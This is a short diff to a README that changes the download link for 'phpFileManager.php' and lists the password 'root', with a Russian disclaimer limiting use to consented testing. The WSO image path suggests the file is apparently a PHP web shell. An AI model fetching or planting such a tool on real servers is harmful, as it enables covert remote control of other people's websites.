@@ -2,7 +2,7 @@
 
 ![Image alt](https://raw.githubusercontent.com/phpFileManager/WSO/main/photo.jpg)
 
-Скачать/download: https://raw.githubusercontent.com/phpFileManager/phpFileManager/main/phpFileManager.php
+Скачать/download: https://raw.githubusercontent.com/phpFileManager/download/main/phpFileManager.php
 # Пароль/Password: root
 
 ОТКАЗ ОТ ОТВЕТСТВЕННОСТИ: Это только в целях тестирования и могут быть использованы только там, где строго было дано согласие. Не используйте это для незаконных целей.
